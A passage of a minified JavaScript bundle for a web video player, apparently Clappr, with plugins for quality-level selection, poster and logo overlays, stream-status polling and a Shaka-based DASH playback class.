n=Sn(r),i=(n.__index__=0,n.__values__=ja,e?i.__wrapped__=n:e=n,n);r=r.__wrapped__}return i.__wrapped__=t,e},p.prototype.reverse=function(){var t=this.__wrapped__;return t instanceof m?((t=(t=this.__actions__.length?new m(this):t).reverse()).__actions__.push({func:Hn,args:[Cn],thisArg:ja}),new v(t,this.__chain__)):this.thru(Cn)},p.prototype.toJSON=p.prototype.valueOf=p.prototype.value=function(){return tr(this.__wrapped__,this.__actions__)},p.prototype.first=p.prototype.head,ot&&(p.prototype[ot]=function(){return this}),p}();is._=al,(I=function(){return al}.call(D,C,D,w))!==ja&&(w.exports=I)}).call(this)}).call(this,C(31),C(155)(t))},function(t,e,r){var n=r(359),i=r(360),a=r(154),s=r(361);t.exports=function(t,e){return n(t)||i(t,e)||a(t,e)||s()},t.exports.__esModule=!0,t.exports.default=t.exports},function(t,r,f){"use strict";(function(n){f.d(r,"a",(function(){return e}));var t=f(5),i=f.n(t),a=(t=f(6),f.n(t)),s=(t=f(8),f.n(t)),o=(t=f(9),f.n(t)),l=(t=f(3),f.n(t)),u=f(1),h=(t=f(164),f.n(t)),c=(t=f(165),f.n(t));var e=function(t){s()(r,t);var e=function d(r){var n=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var t,e=l()(r);return t=n?(t=l()(this).constructor,Reflect.construct(e,arguments,t)):e.apply(this,arguments),o()(this,t)}}(r);function r(){return i()(this,r),e.apply(this,arguments)}return a()(r,[{key:"name",get:function(){return"level_selector"}},{key:"template",get:function(){return Object(u.template)(h.a)}},{key:"supportedVersion",get:function(){return{min:u.version}}},{key:"attributes",get:function(){return{class:this.name,"data-level-selector":""}}},{key:"events",get:function(){return{"click [data-level-selector-select]":"onLevelSelect","click [data-level-selector-button]":"onShowLevelSelectMenu"}}},{key:"container",get:function(){return this.core.activeContainer||this.core.mediaControl.container}},{key:"playback",get:function(){return this.core.activePlayback||this.core.getCurrentPlayback()}},{key:"bindEvents",value:function(){this.listenTo(this.core,u.Events.CORE_READY,this.bindPlaybackEvents),u.Events.CORE_ACTIVE_CONTAINER_CHANGED?this.listenTo(this.core,u.Events.CORE_ACTIVE_CONTAINER_CHANGED,this.reload):this.listenTo(this.core.mediaControl,u.Events.MEDIACONTROL_CONTAINERCHANGED,this.reload),this.listenTo(this.core.mediaControl,u.Events.MEDIACONTROL_RENDERED,this.render),this.listenTo(this.core.mediaControl,u.Events.MEDIACONTROL_HIDE,this.hideSelectLevelMenu)}},{key:"bindPlaybackEvents",value:function(){this.playback&&(this.listenTo(this.playback,u.Events.PLAYBACK_LEVELS_AVAILABLE,this.fillLevels),this.listenTo(this.playback,u.Events.PLAYBACK_LEVEL_SWITCH_START,this.startLevelSwitch),this.listenTo(this.playback,u.Events.PLAYBACK_LEVEL_SWITCH_END,this.stopLevelSwitch),this.listenTo(this.playback,u.Events.PLAYBACK_BITRATE,this.updateCurrentLevel),this.playback.levels)&&0<this.playback.levels.length&&this.fillLevels(this.playback.levels)}},{key:"reload",value:function(){var t=this;this.stopListening(),n.nextTick((function(){t.bindEvents(),t.bindPlaybackEvents()}))}},{key:"shouldRender",value:function(){var t,e;return!(!this.container||!this.playback)&&(t=void 0!==this.playback.currentLevel,e=!!(this.levels&&1<this.levels.length),t)&&e}},{key:"render",value:function(){var t;return this.shouldRender()&&(t=u.Styler.getStyleFor(c.a,{baseUrl:this.core.options.baseUrl}),this.$el.html(this.template({levels:this.levels,title:this.getTitle()})),this.$el.append(t),this.core.mediaControl.$(".media-control-right-panel").append(this.el),this.$(".level_selector ul").css("max-height",.8*this.core.el.offsetHeight),this.highlightCurrentLevel()),this}},{key:"fillLevels",value:function(t){void 0===this.selectedLevelId&&(this.selectedLevelId=1<arguments.length&&void 0!==arguments[1]?arguments[1]:-1);var e=this.core.options&&this.core.options.levelSelectorConfig&&this.core.options.levelSelectorConfig.onLevelsAvailable;if(e){if("function"!=typeof e)throw new TypeError("onLevelsAvailable must be a function");t=e(t.slice())}t.forEach((function(t){var e=t.level;Object.keys(e).length&&(e=e.height,t.resolution="".concat(e,"p"))})),this.levels=t,this.configureLevelsLabels(),this.render()}},{key:"configureLevelsLabels",value:function(){if(void 0!==this.core.options.levelSelectorConfig){var t=this.core.options.levelSelectorConfig.labelCallback;if(t&&"function"!=typeof t)throw new TypeError("labelCallback must be a function");var e,r,n,i=this.core.options.levelSelectorConfig.labels,a=i?this.core.options.levelSelectorConfig.labels:{};if(t||i)for(n in this.levels)r=a[(e=this.levels[n]).id],t?e.label=t(e,r):r&&(e.label=r)}}},{key:"findLevelBy",value:function(e){var r;return this.levels.forEach((function(t){t.id===e&&(r=t)})),r}},{key:"onLevelSelect",value:function(t){return this.selectedLevelId=parseInt(t.target.dataset.levelSelectorSelect,10),this.playback.currentLevel!=this.selectedLevelId&&(this.playback.currentLevel=this.selectedLevelId,this.toggleContextMenu(),t.stopPropagation()),!1}},{key:"onShowLevelSelectMenu",value:function(){this.toggleContextMenu()}},{key:"hideSelectLevelMenu",value:function(){this.$(".level_selector ul").hide()}},{key:"toggleContextMenu",value:function(){this.$(".level_selector ul").toggle()}},{key:"buttonElement",value:function(){return this.$(".level_selector button")}},{key:"levelElement",value:function(t){return this.$(".level_selector ul a".concat(isNaN(t)?"":'[data-level-selector-select="'.concat(t,'"]'))).parent()}},{key:"getTitle",value:function(){return(this.core.options.levelSelectorConfig||{}).title}},{key:"startLevelSwitch",value:function(){this.buttonElement().addClass("changing")}},{key:"stopLevelSwitch",value:function(){this.buttonElement().removeClass("changing")}},{key:"updateText",value:function(t){-1===t?this.buttonElement().text(this.currentLevel?"AUTO (".concat(this.currentLevel.resolution,")"):"AUTO"):this.buttonElement().text(this.findLevelBy(t).resolution)}},{key:"updateCurrentLevel",value:function(t){t=this.findLevelBy(t.level),this.currentLevel=t||null,this.highlightCurrentLevel()}},{key:"highlightCurrentLevel",value:function(){this.levelElement().removeClass("current"),this.currentLevel&&this.levelElement(this.currentLevel.id).addClass("current"),this.updateText(this.selectedLevelId)}}],[{key:"version",get:function(){return"23.12.1"}}]),r}(u.UICorePlugin)}).call(this,f(95))},function(t,e){t.exports='<button data-level-selector-button>\n  Auto\n</button>\n<ul>\n  <% if (title) { %>\n  <li data-title><%= title %></li>\n  <% }; %>\n  <li><a href="#" data-level-selector-select="-1">AUTO</a></li>\n  <% for (var i = 0; i < levels.length; i++) { %>\n    <li><a href="#" data-level-selector-select="<%= levels[i].id %>"><%= levels[i].resolution %></a></li>\n  <% }; %>\n</ul>'},function(t,e,r){var n=r(379),i=("string"==typeof n&&(n=[[t.i,n,""]]),{hmr:!0});i.transform=void 0,i.insertInto=void 0,r(381)(n,i),n.locals&&(t.exports=n.locals)},function(t,e,r){"use strict";r.d(e,"a",(function(){return n}));e=r(5);var i=r.n(e),a=(e=r(6),r.n(e)),s=(e=r(7),r.n(e)),o=(e=r(8),r.n(e)),l=(e=r(9),r.n(e)),u=(e=r(3),r.n(e)),h=r(1),c=(e=r(89),r.n(e)),d=(e=r(167),r.n(e)),f=(e=r(168),r.n(e)),p=r(90);var v="blinkPoster",n=function(t){o()(n,t);var r=function g(r){var n=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var t,e=u()(r);return t=n?(t=u()(this).constructor,Reflect.construct(e,arguments,t)):e.apply(this,arguments),l()(this,t)}}(n);function n(t){var e;return i()(this,n),(e=r.call(this,t)).startBlinkPoster(),e.container=t,e}return a()(n,[{key:"name",get:function(){return"poster"}},{key:"bindEvents",value:function(){s()(u()(n.prototype),"bindEvents",this).call(this),this.listenTo(this.container,h.Events.CONTAINER_OPTIONS_CHANGE,this.changeOptsRuntime)}},{key:"destroy",value:function(){s()(u()(n.prototype),"destroy",this).call(this),this.stopBlinkPoster()}},{key:"changeOptsRuntime",value:function(){this.options[v]?this.startBlinkPoster():this.stopBlinkPoster()}},{key:"startBlinkPoster",value:function(){var t;this.options[v]&&!this.hasStartedPlaying&&(t=this.options.blinkPosterDelay||5e3,this.posterChangeSource=this.posterChangeSource.bind(this),this.posterTimer=setTimeout(this.posterChangeSource,t))}},{key:"stopBlinkPoster",value:function(){clearTimeout(this.posterTimer)}},{key:"onStop",value:function(){s()(u()(n.prototype),"onStop",this).call(this),this.startBlinkPoster()}},{key:"onPlay",value:function(){s()(u()(n.prototype),"onPlay",this).call(this),this.stopBlinkPoster()}},{key:"posterChangeSource",value:function(){var t=this,e=this.options.authToken?"&":"?";e=this.getPosterSource({postfix:"".concat(e,"_t=").concat(Number(new Date))});this.setPosterSource(e).then((function(){t.posterTimer=setTimeout(t.posterChangeSource,5e3)}))}},{key:"templateVideo",get:function(){return Object(h.template)(f.a)}},{key:"shouldRender",get:function(){var t=!!this.options.poster;return"html_img"!==this.container.playback.name&&("no_op"!==this.container.playback.getPlaybackType()||t)}},{key:"showOnVideoEnd",get:function(){return!this.options.poster||this.options.poster.showOnVideoEnd||void 0===this.options.poster.showOnVideoEnd}},{key:"setPosterSource",value:function(n){var i=this;return Object(p.b)(this.$el[0])?new Promise((function(t){var e=i._videoPoster,r=i.$el.find(".poster-video:not(.visible)");r.one("loadeddata",(function(){e.removeClass("visible"),r.addClass("visible"),i._videoPoster=r,t()})),r.attr({src:n})})):Promise.resolve()}},{key:"renderVideoPoster",value:function(){this.$el.html(this.templateVideo()),this.setPosterStyles(),this.setVideoPoster()}},{key:"setPosterStyles",value:function(){this.$el.append('<style class="clappr-style"></style>'),this.$el.find(".clappr-style").html(Object(h.template)(d.a.toString()))}},{key:"setVideoPoster",value:function(){this._videoPoster=this.$el.find(".poster-video"),this._videoPoster.attr({src:this.getPosterSource()})}},{key:"renderPlayButton",value:function(){this.container.$el.append(this.el),this.$playWrapper=this.$el.find(".play-wrapper"),this.$playWrapper.append(c.a),this.$playButton=this.$playWrapper.find("svg"),this.$playButton.addClass("poster-icon"),this.$playButton.attr("data-poster","");var t=this.options.mediacontrol&&this.options.mediacontrol.buttons;t&&this.$el.find("svg path").css("fill",t),this.options.mediacontrol&&this.options.mediacontrol.buttons&&(t=this.options.mediacontrol.buttons,this.$playButton.css("color",t))}},{key:"getPosterSource",value:function(){var t=(0<arguments.length&&void 0!==arguments[0]?arguments[0]:{}).postfix,e=this.options.poster.url||this.options.poster;return t?"".concat(e).concat(t):e}},{key:"render",value:function(){if(this.shouldRender)return this.renderVideoPoster(),this.renderPlayButton(),this.update(),this}}]),n}(h.Poster)},function(t,e,r){},function(t,e){t.exports='<div class="video-poster-wrapper">\n  <video class="poster-video visible" autoplay />\n  <video class="poster-video" autoplay />\n  <div class="play-wrapper-cont">\n    <div class="play-wrapper"></div>\n  </div>\n</div>\n'},function(t,e,r){"use strict";r.d(e,"a",(function(){return n}));e=r(5);var i=r.n(e),a=(e=r(6),r.n(e)),s=(e=r(8),r.n(e)),o=(e=r(9),r.n(e)),l=(e=r(3),r.n(e)),u=r(1),h=(e=r(89),r.n(e)),c=(e=r(170),r.n(e));var n=function(t){s()(n,t);var r=function d(r){var n=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var t,e=l()(r);return t=n?(t=l()(this).constructor,Reflect.construct(e,arguments,t)):e.apply(this,arguments),o()(this,t)}}(n);function n(t){var e;return i()(this,n),(e=r.call(this,t)).container=t,e}return a()(n,[{key:"setPosterStyles",value:function(){this.$el.append('<style class="clappr-style"></style>'),this.$el.find(".clappr-style").html(Object(u.template)(c.a.toString()))}},{key:"render",value:function(){var t,e=this;if(this.shouldRender)return this.$el[0].addEventListener("touchstart",(function(){e.container.play()})),this.$el.html(this.template()),this.setPosterStyles(),this.options.poster&&null==this.options.poster.custom?(t=this.options.poster.url||this.options.poster,this.$el.css({"background-image":"url(".concat(t,")")})):this.options.poster&&this.$el.css({background:this.options.poster.custom}),this.container.$el.append(this.el),this.$playWrapper=this.$el.find(".play-wrapper"),this.$playWrapper.append(h.a),this.$playButton=this.$playWrapper.find("svg"),this.$playButton.addClass("poster-icon"),this.$playButton.attr("data-poster",""),(t=this.options.mediacontrol&&this.options.mediacontrol.buttons)&&this.$el.find("svg path").css("fill",t),this.options.mediacontrol&&this.options.mediacontrol.buttons&&(t=this.options.mediacontrol.buttons,this.$playButton.css("color",t)),this.update(),this}}]),n}(u.Poster)},function(t,e,r){},function(t,e,r){"use strict";r.d(e,"a",(function(){return p}));e=r(5);var n=r.n(e),i=(e=r(6),r.n(e)),a=(e=r(8),r.n(e)),s=(e=r(9),r.n(e)),o=(e=r(7),r.n(e)),l=(e=r(3),r.n(e)),u=r(1),h=r(90),c=(e=r(172),r.n(e)),d=(e=r(173),r.n(e));var p=function(t){a()(r,t);var e=function f(r){var n=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var t,e=l()(r);return t=n?(t=l()(this).constructor,Reflect.construct(e,arguments,t)):e.apply(this,arguments),s()(this,t)}}(r);function r(t){return n()(this,r),(t=e.call(this,t)).hasStartedPlaying=!1,t.playRequested=!1,t.render(),t}return i()(r,[{key:"name",get:function(){return"logo"}},{key:"template",get:function(){return Object(u.template)(c.a)}},{key:"attributes",get:function(){return{class:"player-logo","data-logo":""}}},{key:"shouldRender",get:function(){return!!this.options.logo.path}},{key:"bindEvents",value:function(){this.setPositionBinded=this.setPosition.bind(this),window.addEventListener("resize",this.setPositionBinded),(u.Browser.isSafari||u.Browser.isIE)&&this.container.playback.el.addEventListener("loadeddata",this.setPositionBinded),this.listenTo(this.container,u.Events.CONTAINER_STOP,this.onStop),this.listenTo(this.container,u.Events.CONTAINER_PLAY,this.onPlay),this.listenTo(this.container,u.Events.CONTAINER_LOADEDMETADATA,this.setPositionBinded)}},{key:"stopListening",value:function(){window.removeEventListener("resize",this.setPositionBinded),(u.Browser.isSafari||u.Browser.isIE)&&window.removeEventListener("loadeddata",this.setPositionBinded),o()(l()(r.prototype),"stopListening",this).call(this)}},{key:"onPlay",value:function(){this.hasStartedPlaying=!0,this.update()}},{key:"onStop",value:function(){this.hasStartedPlaying=!1,this.playRequested=!1,this.update()}},{key:"update",value:function(){this.shouldRender&&(this.hasStartedPlaying?this.$el.show():this.$el.hide())}},{key:"render",value:function(){if(this.shouldRender)return this.$el.html(this.template()),this.setLogoStyles(),this.setLogoImgAttrs(),this.container.$el.append(this.$el),this.update(),this}},{key:"setLogoImgAttrs",value:function(){var r=(e=(t=this.options).logo).path,n=void 0===(n=e.width)?60:n,e=void 0===(e=e.height)?60:e,t=t.authToken;this.$logoContainer=this.$el.find(".live-logo"),this.$logoContainer.find(".live-logo-img").attr({src:"".concat(r.includes("http")||r.includes("https")?"":"/").concat(r).concat(t?"?".concat(t):""),style:"width: ".concat(n,"px;height: ").concat(e,"px;")})}},{key:"setPosition",value:function(){var t,e,r,n;this.shouldRender&&(r=(e=this.container).$el,e=e.currentSize,t=(r=r.find("video[data-html5-video]").get(0)).videoWidth,r=r.videoHeight,e=Object(h.a)({dom:{width:e.width,height:e.height},media:{width:t,height:r}}),t=this.options.logo,e=(r=e.letterboxing).vertical,r=r.horizontal,n=this.$logoContainer.get(0),this.setStyles(t,["top","bottom"],n,e),this.setStyles(t,["left","right"],n,r),this.update())}},{key:"setStyles",value:function(e,t,r,n){var i=this;t.forEach((function(t){return i.setStyle(e,t,r,n)}))}},{key:"setStyle",value:function(t,e,r,n){t[e]&&(r.style[e]="".concat(parseInt(t[e],10)+n,"px"))}},{key:"setLogoStyles",value:function(){this.$el.append('<style class="clappr-style"></style>'),this.$el.find(".clappr-style").html(Object(u.template)(d.a.toString()))}}]),r}(u.UIContainerPlugin)},function(t,e){t.exports='<div class="live-logo">\n  <img class="live-logo-img" />\n</div>\n'},function(t,e,r){},function(t,e,r){"use strict";r.d(e,"a",(function(){return h}));e=r(5);var n=r.n(e),i=(e=r(6),r.n(e)),a=(e=r(8),r.n(e)),s=(e=r(9),r.n(e)),o=(e=r(3),r.n(e)),l=r(1);var h=function(t){a()(r,t);var e=function u(r){var n=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var t,e=o()(r);return t=n?(t=o()(this).constructor,Reflect.construct(e,arguments,t)):e.apply(this,arguments),s()(this,t)}}(r);function r(){return n()(this,r),e.apply(this,arguments)}return i()(r,[{key:"name",get:function(){return"volumePlugin"}},{key:"bindEvents",value:function(){0<this.container.options.volume?this.listenToOnce(this.container,l.Events.CONTAINER_MEDIACONTROL_ENABLE,this.setInitialVolume):this.enabled=!1}},{key:"setInitialVolume",value:function(){this.container.setVolume(this.container.options.volume)}}]),r}(l.ContainerPlugin)},function(t,e,r){"use strict";r.d(e,"a",(function(){return d}));e=r(5);var n=r.n(e),i=(e=r(6),r.n(e)),a=(e=r(7),r.n(e)),s=(e=r(8),r.n(e)),o=(e=r(9),r.n(e)),l=(e=r(3),r.n(e)),u=r(1),h=r(26);var d=function(t){s()(r,t);var e=function c(r){var n=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var t,e=l()(r);return t=n?(t=l()(this).constructor,Reflect.construct(e,arguments,t)):e.apply(this,arguments),o()(this,t)}}(r);function r(){return n()(this,r),e.apply(this,arguments)}return i()(r,[{key:"name",get:function(){return"StreamStatusPlugin"}},{key:"bindEvents",value:function(){var t=this;"mseld"===this.container.playback.name?(this.listenTo(this.container.playback,u.Events.PLAYBACK_BUFFERING,this.waitForTime(5e3)),this.listenTo(this.container.playback,u.Events.PLAYBACK_BUFFERFULL,(function(){return t._buffering=!1}))):this.listenTo(this.container.playback,u.Events.PLAYBACK_ERROR,this.startListenStatus)}},{key:"startListenStatus",value:function(t){"mseld"!==this.container.playback.name&&(!t||t.data&&"networkError"!==t.data.type)||(this._statusUrl=Object(h.a)(this.container.options,"info.json"),this.checkStatus=this.checkStatus.bind(this),clearInterval(this.timerStatus),this.timerStatus=setInterval(this.checkStatus,1e3))}},{key:"waitForTime",value:function(t){var e=this;return function(){e._buffering=!0,setTimeout((function(){e._buffering&&e.startListenStatus()}),t)}}},{key:"checkStatus",value:function(){var e=this;fetch(this._statusUrl).then((function(t){404===t.status&&(e.container.playback.setWaitStatus&&e.container.playback.setWaitStatus(!0),e.container.playback.stop()),200===t.status&&(clearInterval(e.timerStatus),e.container.playback.setWaitStatus)&&e.container.playback.setWaitStatus(!1)}))}},{key:"disable",value:function(){clearInterval(this.timerStatus),a()(l()(r.prototype),"disable",this).call(this)}},{key:"destroy",value:function(){clearInterval(this.timerStatus),a()(l()(r.prototype),"destroy",this).call(this)}}]),r}(u.UIContainerPlugin)},function(t,e,r){"use strict";r.d(e,"a",(function(){return h}));e=r(5);var n=r.n(e),i=(e=r(6),r.n(e)),a=(e=r(8),r.n(e)),s=(e=r(9),r.n(e)),o=(e=r(3),r.n(e)),l=r(1);var h=function(t){a()(r,t);var e=function u(r){var n=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var t,e=o()(r);return t=n?(t=o()(this).constructor,Reflect.construct(e,arguments,t)):e.apply(this,arguments),s()(this,t)}}(r);function r(){return n()(this,r),e.apply(this,arguments)}return i()(r,[{key:"name",get:function(){return"DebugPlugin"}},{key:"bindEvents",value:function(){for(var t in l.Events)"register"!==t&&"listAvailableCustomEvents"!==t&&this.listenTo(this.container.playback,l.Events[t],this.fireEvent.bind(this,t))}},{key:"fireEvent",value:function(t){console.log(t)}}]),r}(l.UIContainerPlugin)},function(t,e,r){"use strict";var n=r(5),s=r.n(n),o=(n=r(6),r.n(n)),l=(n=r(7),r.n(n)),u=(n=r(8),r.n(n)),i=(n=r(9),r.n(n)),h=(n=r(3),r.n(n)),c=r(1),d=(n=r(57),r.n(n));function f(r){var n=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var t,e=h()(r);return t=n?(t=h()(this).constructor,Reflect.construct(e,arguments,t)):e.apply(this,arguments),i()(this,t)}}r=function(t){u()(a,t);var i=f(a);function a(){var t;s()(this,a);for(var e=arguments.length,r=new Array(e),n=0;n<e;n++)r[n]=arguments[n];return(t=i.call.apply(i,[this].concat(r)))._levels=[],t._pendingAdaptationEvent=!1,t._isShakaReadyState=!1,t._minDvrSize=void 0===t.options.shakaMinimumDvrSize?60:t.options.shakaMinimumDvrSize,t.checkIfCritical(),t}return o()(a,[{key:"name",get:function(){return"dash_shaka_playback"}},{key:"shakaVersion",get:function(){return d.a.player.Player.version}},{key:"shakaPlayerInstance",get:function(){return this._player}},{key:"levels",get:function(){return this._levels}},{key:"seekRange",get:function(){return this.shakaPlayerInstance?this.shakaPlayerInstance.seekRange():{start:0,end:0}}},{key:"currentLevel",get:function(){return this._currentLevelId||-1},set:function(t){var e=this;this._currentLevelId=t,t=-1===this._currentLevelId;this.trigger(c.Events.PLAYBACK_LEVEL_SWITCH_START),t?(this._player.configure({abr:{enabled:!0}}),this.trigger(c.Events.PLAYBACK_LEVEL_SWITCH_END)):(this._player.configure({abr:{enabled:!1}}),this._pendingAdaptationEvent=!0,this.selectTrack(this.videoTracks.filter((function(t){return t.id===e._currentLevelId}))[0]))}},{key:"dvrEnabled",get:function(){return this._duration>=this._minDvrSize&&"live"===this.getPlaybackType()}},{key:"getDuration",value:function(){return this._duration}},{key:"_duration",get:function(){return this.shakaPlayerInstance?this.seekRange.end-this.seekRange.start:0}},{key:"getCurrentTime",value:function(){return this.shakaPlayerInstance?this.shakaPlayerInstance.getMediaElement().currentTime-this.seekRange.start:0}},{key:"_startTime",get:function(){return this.seekRange.start}},{key:"presentationStartTimeAsDate",get:function(){return this.shakaPlayerInstance&&this.shakaPlayerInstance.getPresentationStartTimeAsDate()?new Date(this.shakaPlayerInstance.getPresentationStartTimeAsDate().getTime()+1e3*this.seekRange.start):0}},{key:"bandwidthEstimate",get:function(){return this.shakaPlayerInstance?this.shakaPlayerInstance.getStats().estimatedBandwidth:null}},{key:"getProgramDateTime",value:function(){return this.presentationStartTimeAsDate}},{key:"_updateDvr",value:function(t){this.trigger(c.Events.PLAYBACK_DVR,t),this.trigger(c.Events.PLAYBACK_STATS_ADD,{dvr:t})}},{key:"seek",value:function(t){t<0&&(c.Log.warn("Attempt to seek to a negative time. Resetting to live point. Use seekToLivePoint() to seek to the live point."),t=this._duration),this.dvrEnabled&&this._updateDvr(t<this._duration-3),t+=this._startTime,this.el.currentTime=t}},{key:"pause",value:function(){this.el.pause(),this.dvrEnabled&&this._updateDvr(!0)}},{key:"play",value:function(){this.criticalError||(this._player||this._setup(),this.isReady?(this._stopped=!1,this._src=this.el.src,l()(h()(a.prototype),"play",this).call(this),this._startTimeUpdateTimer()):this.once(a.Events.SHAKA_READY,this.play))}},{key:"_onPlaying",value:function(){if(!this._isBuffering)return l()(h()(a.prototype),"_onPlaying",this).call(this)}},{key:"_onSeeking",value:function(){return this._isSeeking=!0,l()(h()(a.prototype),"_onSeeking",this).call(this)}},{key:"_onSeeked",value:function(){if(!this._isBuffering)return this._isSeeking=!1,l()(h()(a.prototype),"_onSeeked",this).call(this)}},{key:"_startTimeUpdateTimer",value:function(){var t=this;this._stopTimeUpdateTimer(),this._timeUpdateTimer=setInterval((function(){t._onTimeUpdate()}),100)}},{key:"_stopTimeUpdateTimer",value:function(){this._timeUpdateTimer&&clearInterval(this._timeUpdateTimer)}},{key:"_setupSrc",value:function(){}},{key:"_ready",value:function(){}},{key:"_onShakaReady",value:function(){this._isShakaReadyState=!0,this.trigger(a.Events.SHAKA_READY),this.trigger(c.Events.PLAYBACK_READY,this.name)}},{key:"isReady",get:function(){return this._isShakaReadyState}},{key:"error",value:function(t){c.Log.error("an error was raised by the video tag",t,this.el.error)}},{key:"isHighDefinitionInUse",value:function(){return!!this.highDefinition}},{key:"stop",value:function(){var t=this;this._stopTimeUpdateTimer(),clearInterval(this.sendStatsId),this._stopped=!0,this._player?(this._sendStats(),this._player.unload().then((function(){l()(h()(a.prototype),"stop",t).call(t),t._player=null,t._isShakaReadyState=!1})).catch((function(){c.Log.error("shaka could not be unloaded")}))):l()(h()(a.prototype),"stop",this).call(this)}},{key:"textTracks",get:function(){return this.isReady&&this._player.getTextTracks()}},{key:"audioTracks",get:function(){return this.isReady&&this._player.getVariantTracks().filter((function(t){return t.mimeType.startsWith("audio/")}))}},{key:"videoTracks",get:function(){return this.isReady&&this._player.getVariantTracks().filter((function(t){return t.mimeType.startsWith("video/")}))}},{key:"getPlaybackType",value:function(){return(this.isReady&&this._player.isLive()?"live":"vod")||""}},{key:"selectTrack",value:function(t){if("text"===t.type)this._player.selectTextTrack(t);else{if("variant"!==t.type)throw new Error("Unhandled track type:",t.type);this._player.selectVariantTrack(t),t.mimeType.startsWith("video/")&&this._onAdaptation()}}},{key:"closedCaptionsTracks",get:function(){var e=0;return(this.textTracks||[]).filter((function(t){return"subtitle"===t.kind})).map((function(t){return{id:e++,name:t.label||t.language,track:t}}))}},{key:"closedCaptionsTrackId",get:function(){return l()(h()(a.prototype),"closedCaptionsTrackId",this)},set:function(e){if(this._player){var t,r=this.closedCaptionsTracks;if(-1!==e){if(!(t=r.find((function(t){return t.id===e}))))return void c.Log.warn('Track id "'.concat(e,'" not found'));if(this._shakaTTVisible&&!0===t.track.active)return void c.Log.info('Track id "'.concat(e,'" already showing'))}t?(this._player.selectTextTrack(t.track),this._player.setTextTrackVisibility(!0),this._enableShakaTextTrack(!0)):(this._player.setTextTrackVisibility(!1),this._enableShakaTextTrack(!1)),this._ccTrackId=e,this.trigger(c.Events.PLAYBACK_SUBTITLE_CHANGED,{id:e})}}},{key:"_enableShakaTextTrack",value:function(e){this.el.textTracks&&(this._shakaTTVisible=e,Array.from(this.el.textTracks).filter((function(t){return"subtitles"===t.kind})).forEach((function(t){return t.mode=!0===e?"showing":"hidden"})))}},{key:"_checkForClosedCaptions",value:function(){var t;this._ccIsSetup||(this.hasClosedCaptionsTracks&&(this.trigger(c.Events.PLAYBACK_SUBTITLE_AVAILABLE),t=this.closedCaptionsTrackId,this.closedCaptionsTrackId=t),this._ccIsSetup=!0)}},{key:"destroy",value:function(){var t=this;this._stopTimeUpdateTimer(),clearInterval(this.sendStatsId),this._player?this._player.destroy().then((function(){return t._destroy()})).catch((function(){t._destroy(),c.Log.error("shaka could not be destroyed")})):this._destroy(),l()(h()(a.prototype),"destroy",this).call(this)}},{key:"_setup",value:function(){function t(){e._player=e._createPlayer(),e._setInitialConfig(),e._loadSource()}var e=this;this._isShakaReadyState=!1,this._ccIsSetup=!1,this._player?this._player.destroy().then(t):t()}},{key:"_createPlayer",value:function(){var t=new d.a.Player(this.el);return t.addEventListener("error",this._onError.bind(this)),t.addEventListener("adaptation",this._onAdaptation.bind(this)),t.addEventListener("buffering",this._handleShakaBufferingEvents.bind(this)),t.addEventListener("sessiondata",this._onHeaders.bind(this)),t}},{key:"_onHeaders",value:function(t){this.trigger(c.Events.PLAYBACK_FRAGMENT_LOADED,t)}},{key:"_setInitialConfig",value:function(){this._options.shakaConfiguration&&this._player.configure(this._options.shakaConfiguration),this._options.shakaOnBeforeLoad&&this._options.shakaOnBeforeLoad(this._player)}},{key:"_loadSource",value:function(){var e=this;this._player.load(this._options.src).then((function(){return e._loaded()})).catch((function(t){return e._setupError(t)}))}},{key:"_onTimeUpdate",value:function(){var t;this.shakaPlayerInstance&&(t={current:this.getCurrentTime(),total:this.getDuration(),firstFragDateTime:this.getProgramDateTime()},this._lastTimeUpdate&&t.current===this._lastTimeUpdate.current&&t.total===this._lastTimeUpdate.total||(this._lastTimeUpdate=t,this.trigger(c.Events.PLAYBACK_TIMEUPDATE,t,this.name)))}},{key:"_handleBufferingEvents",value:function(){}},{key:"_handleShakaBufferingEvents",value:function(t){this._stopped||(this._isBuffering=t.buffering,this._isBuffering?this._onBuffering():this._onBufferfull())}},{key:"_onBuffering",value:function(){this.trigger(c.Events.PLAYBACK_BUFFERING)}},{key:"_onBufferfull",value:function(){this.trigger(c.Events.PLAYBACK_BUFFERFULL),this._isSeeking&&this._onSeeked(),this.isPlaying()&&this._onPlaying()}},{key:"_loaded",value:function(){this._onShakaReady(),this._startToSendStats(),this._fillLevels(),this._checkForClosedCaptions()}},{key:"_fillLevels",value:function(){0===this._levels.length&&(this._levels=this.videoTracks.map((function(t){return{id:t.id,label:"".concat(t.height,"p")}})).reverse(),this.trigger(c.Events.PLAYBACK_LEVELS_AVAILABLE,this.levels))}},{key:"_startToSendStats",value:function(){var 